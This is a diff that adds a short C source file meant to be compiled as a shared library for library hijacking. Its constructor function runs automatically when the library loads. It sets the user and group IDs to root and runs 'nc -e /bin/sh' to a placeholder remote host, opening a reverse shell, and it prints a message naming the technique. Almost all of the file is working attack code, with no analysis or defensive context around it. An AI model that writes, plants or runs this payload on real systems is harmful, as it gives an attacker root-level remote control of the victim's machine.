@@ -1,0 +1,28 @@
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <sys/types.h>
+
+#include <unistd.h>
+
+ 
+
+static void revShell() __attribute__((constructor));
+
+ 
+
+void revShell() {
+
+                  setuid(0);
+
+                  setgid(0);
+
+                  printf("Reverse Shell via library hijacking... \n");
+
+                                    const char *ncshell = "nc -e /bin/sh RHOST RPORT &";
+
+                  system(ncshell);
+
+}
+
